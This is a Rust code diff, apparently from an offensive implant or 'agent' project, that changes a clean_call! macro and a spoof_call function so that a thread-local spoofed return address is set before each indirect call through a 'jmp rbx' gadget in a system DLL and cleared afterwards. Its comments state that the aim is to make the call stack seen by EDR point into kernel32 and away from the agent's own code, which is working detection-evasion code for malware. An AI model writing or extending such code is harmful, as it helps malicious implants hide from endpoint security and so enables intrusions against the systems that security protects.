@@ -2299,7 +2299,9 @@ macro_rules! clean_call {
                 if gadget == 0 {
                     Err($crate::syscalls::SyscallError::NoGadgetAvailable)
                 } else {
+                    unsafe { $crate::syscalls::set_spoof_ret(gadget) };
                     let res = unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) };
+                    unsafe { $crate::syscalls::set_spoof_ret(0) };
                     Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
                 }
             }
@@ -2311,7 +2313,13 @@ macro_rules! clean_call {
             if gadget == 0 {
                 Err($crate::syscalls::SyscallError::NoGadgetAvailable)
             } else {
+                // Store the gadget in the thread-local so spoof_call can pick it
+                // up as the spoofed return address.  This ensures the call stack
+                // seen by EDR returns into kernel32 rather than the agent .text.
+                unsafe { $crate::syscalls::set_spoof_ret(gadget) };
                 let res = unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) };
+                // Clear the thread-local spoofed return address after the call.
+                unsafe { $crate::syscalls::set_spoof_ret(0) };
                 Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
             }
         }
@@ -2346,9 +2354,15 @@ macro_rules! clean_call {
             // to attempt a different gadget search, accept the risk, or abort.
             Err($crate::syscalls::SyscallError::NoGadgetAvailable)
         } else {
+            // Store the gadget in the thread-local so spoof_call can pick it
+            // up as the spoofed return address.  This ensures the call stack
+            // seen by EDR returns into kernel32 rather than the agent .text.
+            unsafe { $crate::syscalls::set_spoof_ret(gadget) };
             // Cross-reference: primary spoof_call call site is here.
             // See spoof_call near the bottom Windows helpers section.
             let res = unsafe { $crate::syscalls::spoof_call(addr, gadget, arg1, arg2, arg3, arg4, stack_args) };
+            // Clear the thread-local spoofed return address after the call.
+            unsafe { $crate::syscalls::set_spoof_ret(0) };
             // cast result back
             Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
         }
@@ -3357,20 +3371,17 @@ pub struct stat64 {
 
 #[cfg(windows)]
 thread_local! {
-    #[allow(dead_code)]
     static REAL_RET_ADDR: std::cell::Cell<usize> = std::cell::Cell::new(0);
 }
 
 #[cfg(windows)]
 #[no_mangle]
-#[allow(dead_code)]
 pub unsafe extern "C" fn set_spoof_ret(real_ret: usize) {
     REAL_RET_ADDR.with(|r| r.set(real_ret));
 }
 
 #[cfg(windows)]
 #[no_mangle]
-#[allow(dead_code)]
 pub unsafe extern "C" fn get_spoof_ret() -> usize {
     REAL_RET_ADDR.with(|r| r.get())
 }
@@ -3439,6 +3450,10 @@ pub unsafe fn spoof_call(
     // Stack-spoofing indirect call via a `jmp rbx` gadget in a system DLL.
     //
     // Flow:
+    //   0. If the caller set a spoofed return address via `set_spoof_ret()`,
+    //      prefer that over the `gadget_addr` parameter — this allows the
+    //      `clean_call!` macro to control the spoofed frame address without
+    //      changing the spoof_call signature.
     //   1. Set RBX = address of label 42 (the continuation after the gadget fires).
     //   2. Align the stack, copy extra arguments beyond the first four.
     //   3. Load the first four arguments into rcx/rdx/r8/r9.
@@ -3450,6 +3465,15 @@ pub unsafe fn spoof_call(
     //
     // Label discipline: 41 = skip-stack-copy branch; 42 = post-call continuation.
     // No label appears more than once in this block.
+
+    // Prefer the thread-local spoofed return address when set; this allows
+    // the clean_call! macro to control which address appears as the "caller"
+    // on the stack without passing it through the function signature.
+    let effective_gadget = {
+        let tls_addr = get_spoof_ret();
+        if tls_addr != 0 { tls_addr } else { gadget_addr }
+    };
+
     let status: u64;
     let nstack = stack_args.len();
     let stack_ptr = stack_args.as_ptr();
@@ -3501,7 +3525,7 @@ pub unsafe fn spoof_call(
         // rax holds the API return value; captured by the lateout constraint.
 
         api        = in(reg) api_addr,
-        gadget     = in(reg) gadget_addr,
+        gadget     = in(reg) effective_gadget,
         nstack     = in(reg) nstack,
         stack_ptr  = in(reg) stack_ptr,
         a1         = in(reg) arg1,
